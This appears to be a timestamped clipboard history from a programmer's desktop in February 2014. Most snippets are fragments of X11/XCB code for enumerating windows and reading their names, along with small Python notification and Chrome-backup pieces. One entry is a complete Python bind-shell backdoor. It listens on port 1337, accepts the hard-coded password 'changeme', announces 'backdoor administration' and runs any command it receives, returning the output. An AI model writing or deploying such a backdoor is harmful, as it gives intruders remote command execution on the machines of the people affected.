
* Sat 01 Feb 2014 07:35:10 AM JST
検索画像地図
* Sat 01 Feb 2014 07:49:10 AM JST
XStore
* Sat 01 Feb 2014 07:50:32 AM JST
Xchange
* Sat 01 Feb 2014 07:54:29 AM JST
type
* Sat 01 Feb 2014 07:54:43 AM JST
  
* Sat 01 Feb 2014 07:54:44 AM JST
nitems
* Sat 01 Feb 2014 07:54:49 AM JST
  
* Sat 01 Feb 2014 07:54:50 AM JST
leftover
* Sat 01 Feb 2014 07:54:52 AM JST
char
* Sat 01 Feb 2014 07:54:52 AM JST
long char
* Sat 01 Feb 2014 07:56:11 AM JST
Atom
* Sat 01 Feb 2014 07:56:37 AM JST
                         
* Sat 01 Feb 2014 08:03:02 AM JST
Window win;
* Sat 01 Feb 2014 08:03:21 AM JST
XGetInputFocus(display, &win, &revert);
* Sat 01 Feb 2014 08:05:40 AM JST
(char *)data;
* Sat 01 Feb 2014 08:09:17 AM JST
std::cout << (char *)data << std::endl;
* Sat 01 Feb 2014 08:09:35 AM JST

* Sat 01 Feb 2014 08:09:35 AM JST

* Sat 01 Feb 2014 08:09:35 AM JST
  std::cout << (char *)data << std::endl;

* Sat 01 Feb 2014 08:10:31 AM JST
XInternAtom(dpy,"_NET_WM_NAME",false)
* Sat 01 Feb 2014 08:10:56 AM JST
NAME
* Sat 01 Feb 2014 08:10:58 AM JST
S
* Sat 01 Feb 2014 08:10:58 AM JST
WM_S
* Sat 01 Feb 2014 08:12:02 AM JST
actual_format
* Sat 01 Feb 2014 08:12:21 AM JST
XInternAtom(dpy,"_NET_WM_NAME",false)
* Sat 01 Feb 2014 08:12:39 AM JST
dpy
* Sat 01 Feb 2014 08:12:48 AM JST
XInternAtom(dpy,"UTF8_STRING",false)
* Sat 01 Feb 2014 08:13:07 AM JST
display
* Sat 01 Feb 2014 08:13:35 AM JST
std::cout << (char *)data << std::endl;
* Sat 01 Feb 2014 08:17:44 AM JST
AnyPropertyType
* Sat 01 Feb 2014 08:24:14 AM JST
libx11-xcb-dev
* Sat 01 Feb 2014 08:58:52 AM JST
XFetchName
* Sat 01 Feb 2014 08:59:56 AM JST
XFetchName
* Sat 01 Feb 2014 09:00:35 AM JST
unsigned 
* Sat 01 Feb 2014 09:00:42 AM JST
tesname
* Sat 01 Feb 2014 09:02:13 AM JST
tesname
* Sat 01 Feb 2014 09:11:59 AM JST
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/Xatom.h>
static char *window_id_format = "0x%lx";
int main(void)
{
 unsigned int numkids, i, mapped, scrn;
 Window r, p, *kids;
 XWindowAttributes attr;
 Window root;
 Display *dispsy;
 char *win_name;
 XTextProperty text_prop;
 dispsy = XOpenDisplay(0);

 scrn = DefaultScreen(dispsy);
 root = RootWindow(dispsy, scrn);

 mapped = 0;
 XQueryTree(dispsy, root, &r, &p, &kids, &numkids);
 for(i = 0; i < numkids; ++i)
 {
  XGetWindowAttributes(dispsy, kids[i], &attr);
  if(attr.map_state == IsViewable)
  {
   ++mapped;
   printf(window_id_format, kids[i]);
   status = XGetWMName(dispsy, kids[i], &text_prop);
   if(!status || !text_prop.value || !text_prop.nitems)
   {
    printf("GetWMName error\n");
 //   return -1;
   }
   if(!XFetchName(dispsy, kids[i], &win_name))
   {
    printf("(has no name)\n");
    printf(" \n");
   }
   else if(win_name)
   {
    printf("win_name =  %s \n", win_name);
    XFree(win_name);
   }
  }
 }
}

* Sat 01 Feb 2014 10:25:05 PM JST
import pynotify
* Sat 01 Feb 2014 10:25:28 PM JST
        notify = pynotify.init('test')
        if notify:
            ntif = pynotify.Notification('Daily Script', 'Open Webpage.')
            ntif.set_timeout(5000)
            ntif.show()

* Sat 01 Feb 2014 10:31:28 PM JST
    notify = pynotify.init('test')
    if notify:
        ntif = pynotify.Notification('chrome modify as allow root',
                                     'Successed!!.')
        ntif.set_timeout(5000)
        ntif.show()

* Sat 01 Feb 2014 10:31:47 PM JST
test
* Sat 01 Feb 2014 10:32:04 PM JST
if notify:
    ntif = pynotify.Notification('chrome modify as allow root',
                                 'Successed!!.')
    ntif.set_timeout(5000)
    ntif.show()

* Sat 01 Feb 2014 10:32:30 PM JST
'copy: {0} => {1}'.format(chromepath, os.path.join(tmpdir,
                                                os.path.basename(chromepath)))
* Sat 01 Feb 2014 10:32:44 PM JST
            
* Sat 01 Feb 2014 10:32:48 PM JST
                                             
* Sat 01 Feb 2014 10:32:54 PM JST
            
* Sat 01 Feb 2014 10:33:06 PM JST

* Sat 01 Feb 2014 10:33:06 PM JST

* Sat 01 Feb 2014 10:33:06 PM JST
    print()

* Sat 01 Feb 2014 10:33:22 PM JST

* Sat 01 Feb 2014 10:33:22 PM JST

* Sat 01 Feb 2014 10:33:23 PM JST
    notify = pynotify.init('test')

* Sat 01 Feb 2014 11:37:08 PM JST
class_Exception 
* Sat 01 Feb 2014 11:39:48 PM JST
isfile()
* Sat 01 Feb 2014 11:39:48 PM JST
path.isfile()
* Sat 01 Feb 2014 11:40:01 PM JST
isfile
* Sat 01 Feb 2014 11:40:11 PM JST
isfile()
* Sat 01 Feb 2014 11:40:12 PM JST
path.isfile()
* Sat 01 Feb 2014 11:43:03 PM JST
tempfileutil.tmp_backup('/')
* Sat 01 Feb 2014 11:43:57 PM JST
SUMMARY
* Sat 01 Feb 2014 11:44:12 PM JST
in
* Sat 01 Feb 2014 11:45:40 PM JST

* Sat 01 Feb 2014 11:45:40 PM JST

* Sat 01 Feb 2014 11:45:40 PM JST
    tmpdir = tempfile.mkdtemp()

* Sat 01 Feb 2014 11:45:40 PM JST
    tmpdir = tempfile.mkdtemp()

* Sat 01 Feb 2014 11:45:40 PM JST
    tmpdir = tempfile.mkdtemp()
    shutil.copy2(chromepath, tmpdir)

* Sat 01 Feb 2014 11:45:44 PM JST
backuped_path
* Sat 01 Feb 2014 11:45:50 PM JST
                    
* Sat 01 Feb 2014 11:46:06 PM JST
            
* Sat 01 Feb 2014 11:46:09 PM JST
            
* Sat 01 Feb 2014 11:47:54 PM JST
'/opt/google/chrome/chrome'
* Sat 01 Feb 2014 11:50:07 PM JST

* Sat 01 Feb 2014 11:50:07 PM JST

* Sat 01 Feb 2014 11:50:07 PM JST
import shutil

* Sat 01 Feb 2014 11:50:08 PM JST

* Sat 01 Feb 2014 11:50:08 PM JST

* Sat 01 Feb 2014 11:50:08 PM JST
import tempfile

* Sat 01 Feb 2014 11:52:05 PM JST
tmp_backup
* Sat 01 Feb 2014 11:52:14 PM JST
FileNotExistError
* Sat 01 Feb 2014 11:53:21 PM JST
    
* Sun 02 Feb 2014 01:04:04 PM JST
tutoria
* Sun 02 Feb 2014 02:45:42 PM JST
tutoria
* Sun 02 Feb 2014 02:56:11 PM JST
python
* Mon 03 Feb 2014 07:59:42 AM JST
xcb_connection_t
* Mon 03 Feb 2014 08:02:56 AM JST
#include <xcb/xcb.h>
* Mon 03 Feb 2014 08:03:16 AM JST
xcb_connection_t *c;
* Mon 03 Feb 2014 08:03:50 AM JST
xcb_connect(0, &screen)
* Mon 03 Feb 2014 08:04:03 AM JST
int screen;
* Mon 03 Feb 2014 08:04:50 AM JST
    if(xcb_connection_has_error(c))
    {
	fputs("Connect failed.\n", stderr);
	exit(1);
    }

* Mon 03 Feb 2014 08:05:16 AM JST
"Connect failed.\n"
* Mon 03 Feb 2014 08:05:29 AM JST

* Mon 03 Feb 2014 08:05:29 AM JST

* Mon 03 Feb 2014 08:05:29 AM JST
      fputs("Connect failed.\n", stderr);

* Mon 03 Feb 2014 08:05:35 AM JST
1
* Mon 03 Feb 2014 08:08:53 AM JST
xcb_get_setup
* Mon 03 Feb 2014 08:30:16 AM JST
xcb-shape
* Mon 03 Feb 2014 08:56:51 AM JST
Hidden
* Mon 03 Feb 2014 08:57:18 AM JST
  
* Mon 03 Feb 2014 08:57:19 AM JST
  
* Mon 03 Feb 2014 08:57:52 AM JST
Disp
* Mon 03 Feb 2014 08:58:19 AM JST

* Mon 03 Feb 2014 08:58:20 AM JST

* Mon 03 Feb 2014 08:58:20 AM JST
  virtual ~SingleConnection();

* Mon 03 Feb 2014 09:01:37 AM JST
struct DisplayError : public std::exception                            
{                                                                     
  std::string s;                                                     
  DisplayError(std::string ss) : s(ss) {}                             
  ~DisplayError() throw () {} // Updated                              
  const char* what() const throw() { return s.c_str(); }             
};                                                                    

* Mon 03 Feb 2014 09:01:47 AM JST
Display
* Mon 03 Feb 2014 09:02:32 AM JST
open 
* Mon 03 Feb 2014 09:02:32 AM JST
t open 
* Mon 03 Feb 2014 09:02:33 AM JST
Couldn't open 
* Mon 03 Feb 2014 09:03:32 AM JST
xcb_disconnect
* Mon 03 Feb 2014 09:05:32 AM JST

* Mon 03 Feb 2014 09:06:43 AM JST
  
* Mon 03 Feb 2014 09:11:39 AM JST
  
* Mon 03 Feb 2014 09:13:46 AM JST
SingleConnection &SingleConnection::getInstance()
{
  static SingleConnection instance;
  return instance;
}

* Mon 03 Feb 2014 09:14:14 AM JST
return getInstance().display;
* Mon 03 Feb 2014 09:14:23 AM JST

* Mon 03 Feb 2014 09:14:23 AM JST

* Mon 03 Feb 2014 09:14:23 AM JST
  return instance;

* Mon 03 Feb 2014 09:15:19 AM JST
xcb_connection_t
* Mon 03 Feb 2014 09:15:31 AM JST
    
* Mon 03 Feb 2014 09:18:55 AM JST

* Mon 03 Feb 2014 09:18:55 AM JST

* Mon 03 Feb 2014 09:18:55 AM JST
  int screen;

* Mon 03 Feb 2014 10:08:17 PM JST
#!/usr/bin/python

import socket
import subprocess
import os
import signal

def ctrlc_handler(signum, frm):
        client.send(“+ Someone trys to shut down the server.\n”)

# create socket to listen on
tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcpSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
tcpSocket.bind((“0.0.0.0″, 1337))
tcpSocket.listen(1)

while True:
        # waiting for client connection
        try:
                (client, (ip, port)) = tcpSocket.accept()

                signal.signal(signal.SIGINT, ctrlc_handler)

                # check for correct password
                client.send(“+ Password: “)
                pwd = client.recv(2048)
                if pwd.strip() == “changeme”:

                        # welcome message to client
                        client.send(“\n\n+++ Welcome to the backdoor administration +++\n”)
                        client.send(“You are connected from: ” + str(ip) + “:” + str(port) + “\n\n”)

                        # getting and executing commands
                        data = “dummy”
                        while data != “exit”:
                                try:
                                        client.send(“# “)
                                        data = client.recv(2048)
                                        data = data.strip()

                                        if data == “exit”:
                                                break

                                        if data == “killserver”:
                                                client.send(“+ Shutting down server…\n”)
                                                os._exit(0)

                                        data_list = data.split(” “)
                                        out = subprocess.check_output(data_list)
                                        out_list = out.split(“\n”)
                                        for i in out_list:
                                                if i != “”:
                                                        client.send(“-> ” + i + “\n”)
                                except Exception as e:
                                        client.send(str(e) + “\n”)

                else:
                        client.send(“- Password incorrect.”)

                # closing connection
                client.close()
        except:
                pass
* Mon 03 Feb 2014 10:08:58 PM JST
“
* Mon 03 Feb 2014 10:09:21 PM JST
”
* Mon 03 Feb 2014 11:30:24 PM JST
xcb_atom_t
* Mon 03 Feb 2014 11:31:12 PM JST
  
* Mon 03 Feb 2014 11:31:23 PM JST
  
* Mon 03 Feb 2014 11:31:47 PM JST
_NET_WM_DESKTOP
* Mon 03 Feb 2014 11:31:50 PM JST
  
* Mon 03 Feb 2014 11:31:53 PM JST
_NET_WM_WINDOW_TYPE
* Mon 03 Feb 2014 11:31:57 PM JST
  
* Mon 03 Feb 2014 11:32:04 PM JST
"_NET_WM_STATE"
* Mon 03 Feb 2014 11:32:07 PM JST
_NET_WM_STATE
* Mon 03 Feb 2014 11:32:09 PM JST
  
* Mon 03 Feb 2014 11:32:16 PM JST
_NET_WM_PID
* Mon 03 Feb 2014 11:32:17 PM JST
  
* Mon 03 Feb 2014 11:32:21 PM JST

* Mon 03 Feb 2014 11:32:21 PM JST

* Mon 03 Feb 2014 11:32:21 PM JST
  xcb_atom_t _NET_WM_DESKTOP;

* Mon 03 Feb 2014 11:32:27 PM JST
_NET_FRAME_EXTENTS
* Mon 03 Feb 2014 11:32:28 PM JST
  
* Mon 03 Feb 2014 11:33:01 PM JST
UTF8_STRING
* Mon 03 Feb 2014 11:33:33 PM JST
xcb_intern_atom
* Mon 03 Feb 2014 11:33:59 PM JST
xcb_connection_t *connection
* Mon 03 Feb 2014 11:34:11 PM JST
xcb_connection_t *connection
* Mon 03 Feb 2014 11:35:45 PM JST
UTF8_STRING
* Mon 03 Feb 2014 11:35:57 PM JST
"UTF8_STRING"
* Mon 03 Feb 2014 11:37:17 PM JST
#include "single_display.h"
* Mon 03 Feb 2014 11:37:28 PM JST
SingleDisplay &dis1 = SingleDisplay::getInstance();
* Mon 03 Feb 2014 11:37:35 PM JST
Display *dis3 = SingleDisplay::getInstance().display;
* Mon 03 Feb 2014 11:38:13 PM JST
xcb_connection_t *con1 = SingleConnection::getConnection();
* Mon 03 Feb 2014 11:41:19 PM JST
#include<cstring>
* Mon 03 Feb 2014 11:47:54 PM JST
strlen(
* Mon 03 Feb 2014 11:49:48 PM JST
xcb_intern_atom_cookie_t
* Mon 03 Feb 2014 11:51:07 PM JST
xcb_intern_atom
* Tue 04 Feb 2014 12:05:45 AM JST
UTF8_STRING = 
* Tue 04 Feb 2014 12:06:43 AM JST
xcb_atom_t GetAtom(std::string name)
* Tue 04 Feb 2014 12:08:19 AM JST
xcb_intern_atom(con, false, name.length(), name.c_str())
* Tue 04 Feb 2014 12:10:24 AM JST
atom
* Tue 04 Feb 2014 12:10:24 AM JST
xcb_atom
* Tue 04 Feb 2014 12:10:37 AM JST
ret 
* Tue 04 Feb 2014 12:12:02 AM JST
"UTF8_STRING"
* Tue 04 Feb 2014 12:12:47 AM JST
_NET_WM_NAME
* Tue 04 Feb 2014 12:13:00 AM JST
_NET_WM_DESKTOP
* Tue 04 Feb 2014 12:31:29 AM JST
_NET_WM_WINDOW_TYPE
* Tue 04 Feb 2014 12:32:06 AM JST
_NET_WM_STATE
* Tue 04 Feb 2014 12:32:15 AM JST
_NET_WM_PID
* Tue 04 Feb 2014 12:32:23 AM JST
_NET_FRAME_EXTENTS
* Tue 04 Feb 2014 12:38:38 AM JST
// int main(int argc, char **argv)
// {
//   xcb_connection_t *con1 = SingleConnection::getConnection();
//   xcb_connection_t *con2 = SingleConnection::getConnection();
//   if (con1 == con2) {
//     std::cout << "OK" << std::endl;
//   } else {
//     std::cerr << "ERROR" << std::endl;
//     exit(-1);
//   }

//   return EXIT_SUCCESS;
// }

* Tue 04 Feb 2014 12:41:41 AM JST
struct ConnectionError : public std::exception                            
{                                                                     
  std::string s;                                                     
  ConnectionError(std::string ss) : s(ss) {}                             
  ~ConnectionError() throw () {} // Updated                              
  const char* what() const throw() { return s.c_str(); }             
};                                                                    

class SingleConnection
{
private:
  SingleConnection();
  SingleConnection(const SingleConnection &other){};
  SingleConnection &operator=(const SingleConnection &other) {};
  
public:
  static SingleConnection &getInstance();
  static xcb_connection_t *getConnection();
  virtual ~SingleConnection();
  xcb_connection_t *connection;
  int screen;
};

* Tue 04 Feb 2014 12:41:47 AM JST

* Tue 04 Feb 2014 12:41:48 AM JST

* Tue 04 Feb 2014 12:41:48 AM JST
#include <xcb/xcb.h>

* Tue 04 Feb 2014 12:44:09 AM JST

* Tue 04 Feb 2014 12:44:09 AM JST

* Tue 04 Feb 2014 12:44:09 AM JST
#include <vector>

* Tue 04 Feb 2014 12:44:11 AM JST

* Tue 04 Feb 2014 12:44:11 AM JST

* Tue 04 Feb 2014 12:44:11 AM JST
#include <vector>

* Tue 04 Feb 2014 12:44:18 AM JST

* Tue 04 Feb 2014 12:44:18 AM JST

* Tue 04 Feb 2014 12:44:18 AM JST
  std::vector<std::string> atom_names;

* Tue 04 Feb 2014 12:44:27 AM JST

* Tue 04 Feb 2014 12:44:27 AM JST

* Tue 04 Feb 2014 12:44:27 AM JST
#include "single_connection.cc"

* Tue 04 Feb 2014 12:56:27 AM JST
Window_With_Name
* Tue 04 Feb 2014 01:33:20 AM JST

* Tue 04 Feb 2014 01:33:20 AM JST

* Tue 04 Feb 2014 01:33:20 AM JST
      printf("DEBUG-5-dsimple.c\n");

* Tue 04 Feb 2014 05:48:37 AM JST

* Tue 04 Feb 2014 05:48:37 AM JST

* Tue 04 Feb 2014 05:48:37 AM JST
  SingleConnection(

* Tue 04 Feb 2014 05:48:56 AM JST
xcb_connection_t *con1 = SingleConnection::getConnection();
* Tue 04 Feb 2014 05:49:24 AM JST
con1
* Tue 04 Feb 2014 05:50:49 AM JST
ro
* Tue 04 Feb 2014 05:50:49 AM JST
setup_ro
* Tue 04 Feb 2014 05:53:21 AM JST

* Tue 04 Feb 2014 05:53:21 AM JST

* Tue 04 Feb 2014 05:53:21 AM JST
  int i;

* Tue 04 Feb 2014 05:53:27 AM JST
   
* Tue 04 Feb 2014 06:02:26 AM JST
xcb_get_property_cookie_t get_net_wm_name;
* Tue 04 Feb 2014 06:02:54 AM JST
xcb_get_net_wm_name (dpy, top)
* Tue 04 Feb 2014 06:02:57 AM JST
top
* Tue 04 Feb 2014 06:03:05 AM JST
dpy
* Tue 04 Feb 2014 06:03:36 AM JST
xcb_get_net_wm_name
* Tue 04 Feb 2014 06:03:44 AM JST
#include <xcb/xproto.h>
* Tue 04 Feb 2014 06:03:59 AM JST
# include <xcb/xcb_icccm.h>
* Tue 04 Feb 2014 06:04:11 AM JST

* Tue 04 Feb 2014 06:04:11 AM JST

* Tue 04 Feb 2014 06:04:11 AM JST
#include <xcb/xcb_icccm.h>

* Tue 04 Feb 2014 06:04:25 AM JST
xcb_get_net_wm_name
* Tue 04 Feb 2014 06:05:03 AM JST
scon.getConnection()
* Tue 04 Feb 2014 06:06:43 AM JST
Atoms atoms(con1);
//   std::cout << atoms.UTF8_STRING << std::endl;
* Tue 04 Feb 2014 06:06:55 AM JST

* Tue 04 Feb 2014 06:06:55 AM JST

* Tue 04 Feb 2014 06:06:55 AM JST
  //   std::cout << atoms.UTF8_STRING << std::endl;

* Tue 04 Feb 2014 06:07:31 AM JST
STRING
* Tue 04 Feb 2014 06:07:32 AM JST
UTF8_STRING
* Tue 04 Feb 2014 06:08:16 AM JST
BUFSIZ
* Tue 04 Feb 2014 06:11:34 AM JST
screen
* Tue 04 Feb 2014 06:11:54 AM JST
get
* Tue 04 Feb 2014 06:12:37 AM JST
                   
* Tue 04 Feb 2014 06:12:56 AM JST
xcb_get_property
* Tue 04 Feb 2014 06:14:35 AM JST
xcb_get_net_wm_name
* Tue 04 Feb 2014 06:14:43 AM JST

* Tue 04 Feb 2014 06:14:43 AM JST

* Tue 04 Feb 2014 06:14:43 AM JST
      printf("DEBUG-6-dsimple.c\n");

* Tue 04 Feb 2014 06:15:33 AM JST
xcb_get_net_wm_name
* Tue 04 Feb 2014 06:15:52 AM JST
BUFSIZ
* Tue 04 Feb 2014 06:18:36 AM JST
scon.getConnection()
* Tue 04 Feb 2014 06:18:41 AM JST
connections
* Tue 04 Feb 2014 06:19:05 AM JST
connection
* Tue 04 Feb 2014 06:24:31 AM JST

* Tue 04 Feb 2014 06:24:31 AM JST

* Tue 04 Feb 2014 06:24:31 AM JST
  test();

* Tue 04 Feb 2014 06:28:09 AM JST

* Tue 04 Feb 2014 06:28:09 AM JST

* Tue 04 Feb 2014 06:28:09 AM JST
  tes();

* Tue 04 Feb 2014 06:28:39 AM JST
BUFSIZ
* Tue 04 Feb 2014 06:29:00 AM JST
<cstdio>
* Tue 04 Feb 2014 06:29:22 AM JST
BUFSIZ
* Tue 04 Feb 2014 06:29:37 AM JST
std::
* Tue 04 Feb 2014 06:30:30 AM JST
_NET_WM_NAME
* Tue 04 Feb 2014 06:30:46 AM JST
UTF8_STRING
* Tue 04 Feb 2014 06:30:51 AM JST
_NET_WM_NAME
* Tue 04 Feb 2014 06:31:03 AM JST
UTF8_STRING
* Tue 04 Feb 2014 06:31:14 AM JST
_NET_WM_NAME
* Tue 04 Feb 2014 06:31:23 AM JST
UTF8_STRING
* Tue 04 Feb 2014 06:32:29 AM JST
xcb_get_property
* Tue 04 Feb 2014 06:32:53 AM JST
false
* Tue 04 Feb 2014 06:34:51 AM JST

* Tue 04 Feb 2014 06:34:51 AM JST

* Tue 04 Feb 2014 06:34:51 AM JST
  xcb_get_property_cookie_t get_net_wm_name;

* Tue 04 Feb 2014 06:34:51 AM JST
  xcb_get_property_cookie_t get_net_wm_name;

* Tue 04 Feb 2014 06:34:51 AM JST
  xcb_get_property_cookie_t get_net_wm_name;
  xcb_atom_t _NET_WM_NAME, UTF8_STRING;

* Tue 04 Feb 2014 06:35:21 AM JST

* Tue 04 Feb 2014 06:35:21 AM JST

* Tue 04 Feb 2014 06:35:21 AM JST
  _NET_WM_NAME = atoms._NET_WM_NAME;

* Tue 04 Feb 2014 06:35:22 AM JST
  _NET_WM_NAME = atoms._NET_WM_NAME;

* Tue 04 Feb 2014 06:35:22 AM JST
  _NET_WM_NAME = atoms._NET_WM_NAME;
  UTF8_STRING = atoms.UTF8_STRING;

* Tue 04 Feb 2014 06:39:19 AM JST
xcb_get_property_cookie_t get_net_wm_name;
* Tue 04 Feb 2014 06:39:30 AM JST
get_net_wm_name
* Tue 04 Feb 2014 06:39:38 AM JST

* Tue 04 Feb 2014 06:39:38 AM JST

* Tue 04 Feb 2014 06:39:38 AM JST
  // xcb_get_property(xcb_connection_t *c, uint8_t _delete, xcb_window_t window, xcb_atom_t property, xcb_atom_t type, uint32_t long_offset, uint32_t long_length)

* Tue 04 Feb 2014 06:39:40 AM JST

* Tue 04 Feb 2014 06:39:40 AM JST

* Tue 04 Feb 2014 06:39:40 AM JST
  // xcb_get_net_wm_name (scon.getConnection(), screen);

* Tue 04 Feb 2014 06:39:49 AM JST
xcb_get_property_cookie_t get_
* Tue 04 Feb 2014 06:39:51 AM JST
get_
* Tue 04 Feb 2014 06:39:53 AM JST
get_
* Tue 04 Feb 2014 06:40:46 AM JST
xcb_generic_error_t *err;
* Tue 04 Feb 2014 06:40:59 AM JST
xcb_get_property_reply_t *prop;
* Tue 04 Feb 2014 06:41:07 AM JST
prop = xcb_get_property_reply (dpy, cookies->get_net_wm_name, &err);
* Tue 04 Feb 2014 06:41:17 AM JST
get_
* Tue 04 Feb 2014 06:41:18 AM JST
cookies->get_
* Tue 04 Feb 2014 06:41:25 AM JST
dpy
* Tue 04 Feb 2014 06:41:54 AM JST
const char *prop_name = xcb_get_property_value (prop);
* Tue 04 Feb 2014 06:42:24 AM JST
const 
* Tue 04 Feb 2014 06:42:48 AM JST
char *prop_name = 
* Tue 04 Feb 2014 06:44:59 AM JST
prop_name
* Tue 04 Feb 2014 06:45:56 AM JST
xcb_get_property_value
* Tue 04 Feb 2014 06:47:04 AM JST
CHAR
* Tue 04 Feb 2014 06:47:20 AM JST
xcb_get_property_value(prop)
* Tue 04 Feb 2014 06:48:02 AM JST
xcb_get_property_value
* Tue 04 Feb 2014 06:53:06 AM JST
(char*)
* Tue 04 Feb 2014 06:53:24 AM JST
prop
* Tue 04 Feb 2014 06:53:25 AM JST
prop_name
* Tue 04 Feb 2014 06:55:49 AM JST
class Atoms
{
  xcb_connection_t *connection;
  xcb_atom_t GetAtom(std::string name);
  
public:
  Atoms(xcb_connection_t *con);
  virtual ~Atoms();
  xcb_atom_t UTF8_STRING;
  xcb_atom_t _NET_WM_NAME;
  xcb_atom_t _NET_WM_DESKTOP;
  xcb_atom_t _NET_WM_WINDOW_TYPE;
  xcb_atom_t _NET_WM_STATE;
  xcb_atom_t _NET_WM_PID;
  xcb_atom_t _NET_FRAME_EXTENTS;
};

xcb_atom_t Atoms::GetAtom(std::string name)
{
  xcb_intern_atom_reply_t *reply = xcb_intern_atom_reply(connection,
                 xcb_intern_atom(connection, false, name.length(),
                                 name.c_str()),
                                                         NULL);
  if (reply) {
    xcb_atom_t ret = reply->atom;
    free(reply);
    return ret;
  } else {
    return XCB_ATOM_NONE;
  }
}


* Tue 04 Feb 2014 06:56:05 AM JST

* Tue 04 Feb 2014 06:56:05 AM JST

* Tue 04 Feb 2014 06:56:06 AM JST
#include <xcb/xcb.h>

* Tue 04 Feb 2014 06:56:15 AM JST

* Tue 04 Feb 2014 06:56:15 AM JST

* Tue 04 Feb 2014 06:56:15 AM JST
#include <string>

* Tue 04 Feb 2014 07:00:40 AM JST
xcb_atom_t Atoms::GetAtom(std::string name)
{
  xcb_intern_atom_reply_t *reply = xcb_intern_atom_reply(connection,
                      xcb_intern_atom(connection, false, name.length(),
                                      name.c_str()),
                                                         NULL);
  if (reply) {
    xcb_atom_t ret = reply->atom;
    free(reply);
    return ret;
  } else {
    return XCB_ATOM_NONE;
  }
}

* Tue 04 Feb 2014 07:35:33 AM JST
xcb_flush (dpy);
* Tue 04 Feb 2014 07:35:59 AM JST
dpy
* Tue 04 Feb 2014 07:38:30 AM JST
xcb_get_property_value
* Tue 04 Feb 2014 07:51:08 AM JST
xcb_get_property_value
* Tue 04 Feb 2014 07:52:17 AM JST
xcb_get_property_value
* Tue 04 Feb 2014 07:57:00 AM JST
char
* Tue 04 Feb 2014 07:58:45 AM JST
  void *prop_name;
  prop_name = xcb_get_property_value(prop);
  std::cout << prop_name << std::endl;

* Tue 04 Feb 2014 08:01:08 AM JST
setlocale (LC_ALL, "")
* Tue 04 Feb 2014 08:01:24 AM JST
setlocale
* Tue 04 Feb 2014 08:01:38 AM JST
<clocale>
* Tue 04 Feb 2014 08:07:57 AM JST
format
* Tue 04 Feb 2014 08:07:57 AM JST
restrict __format
* Tue 04 Feb 2014 08:07:58 AM JST
char *restrict __format
* Tue 04 Feb 2014 08:07:58 AM JST
const char *restrict __format
* Tue 04 Feb 2014 08:08:08 AM JST
(char *)prop_name
* Tue 04 Feb 2014 08:08:51 AM JST
prop_name
* Tue 04 Feb 2014 08:10:59 AM JST
setlocale (LC_ALL, "")
* Tue 04 Feb 2014 08:11:51 AM JST
atoms.UTF8_STRING
* Tue 04 Feb 2014 08:12:13 AM JST
prop->type
* Tue 04 Feb 2014 08:14:33 AM JST
net_wm_name
* Tue 04 Feb 2014 08:14:44 AM JST

* Tue 04 Feb 2014 08:14:44 AM JST

* Tue 04 Feb 2014 08:14:44 AM JST
  std::cout << "DEBUG-5-tmp.cc" << "  net_wm_name:" << net_wm_name << std::endl;

* Tue 04 Feb 2014 08:16:21 AM JST

* Tue 04 Feb 2014 08:16:21 AM JST

* Tue 04 Feb 2014 08:16:21 AM JST
  xcb_flush (connection);

* Tue 04 Feb 2014 08:16:24 AM JST

* Tue 04 Feb 2014 08:16:24 AM JST

* Tue 04 Feb 2014 08:16:24 AM JST
  xcb_flush (connection);

* Tue 04 Feb 2014 08:23:33 AM JST
int prop_name_len = xcb_get_property_value_length (prop);
* Tue 04 Feb 2014 08:27:00 AM JST
atoms._NET_WM_NAME
* Tue 04 Feb 2014 08:27:27 AM JST
  std::cout << "DEBUG-6-tmp.cc" << "  atoms._NET_WM_NAME:" << atoms._NET_WM_NAME << std::endl;
  

* Tue 04 Feb 2014 08:35:02 AM JST
connection = xcb_connect(0, &screen);
* Tue 04 Feb 2014 08:36:37 AM JST
xcb_connection_t
* Tue 04 Feb 2014 10:45:16 PM JST
xcb_query_tree_cookie_t query_tree;
* Tue 04 Feb 2014 10:46:40 PM JST
xcb_query_tree
* Tue 04 Feb 2014 10:50:28 PM JST
tree = xcb_query_tree_reply (dpy, cookies->query_tree, &err);
* Tue 04 Feb 2014 10:50:51 PM JST
dpy
* Tue 04 Feb 2014 10:51:06 PM JST
xcb_query_tree_reply_t *tree;
* Tue 04 Feb 2014 10:52:05 PM JST

* Tue 04 Feb 2014 10:52:05 PM JST

* Tue 04 Feb 2014 10:52:05 PM JST
#endif

* Tue 04 Feb 2014 10:52:29 PM JST
      
* Tue 04 Feb 2014 11:39:34 PM JST
xcb_get_property_cookie_t net_wm_name;
* Tue 04 Feb 2014 11:39:39 PM JST
net_
* Tue 04 Feb 2014 11:39:43 PM JST
  net_wm_name = xcb_get_property(connection, false, screen->root,
                   atoms._NET_WM_NAME, atoms.UTF8_STRING, 0, BUFSIZ);

* Tue 04 Feb 2014 11:40:35 PM JST
net_
* Tue 04 Feb 2014 11:47:28 PM JST
void *prop_name;
* Tue 04 Feb 2014 11:47:41 PM JST
(char *)
* Tue 04 Feb 2014 11:47:56 PM JST

* Tue 04 Feb 2014 11:47:56 PM JST

* Tue 04 Feb 2014 11:47:56 PM JST
    printf("%s", (char *)prop_name);

* Tue 04 Feb 2014 11:47:58 PM JST
std::cout << prop_name << std::endl;
* Wed 05 Feb 2014 12:05:10 AM JST
  xcb_query_tree_reply_t *tree;
  tree = xcb_query_tree_reply (connection, query_tree, &err);

* Wed 05 Feb 2014 12:05:32 AM JST

* Wed 05 Feb 2014 12:05:32 AM JST

* Wed 05 Feb 2014 12:05:32 AM JST
  xcb_generic_error_t *err;

* Wed 05 Feb 2014 12:11:02 AM JST
  xcb_query_tree_cookie_t query_tree = xcb_query_tree(connection, screen->root);
  xcb_query_tree_reply_t *tree;
  xcb_generic_error_t *err;
  tree = xcb_query_tree_reply (connection, query_tree, &err);

* Wed 05 Feb 2014 12:14:08 AM JST

* Wed 05 Feb 2014 12:14:08 AM JST

* Wed 05 Feb 2014 12:14:08 AM JST
  std::cout << "DEBUG-6-tmp.cc" << "  atoms._NET_WM_NAME:" << atoms._NET_WM_NAME << std::endl;

* Wed 05 Feb 2014 12:15:12 AM JST
unsigned int nchildren;
* Wed 05 Feb 2014 12:15:19 AM JST
xcb_window_t *children;
* Wed 05 Feb 2014 12:15:37 AM JST
nchildren = xcb_query_tree_children_length (tree);
* Wed 05 Feb 2014 12:15:45 AM JST
children = xcb_query_tree_children (tree);
* Wed 05 Feb 2014 12:19:21 AM JST
    
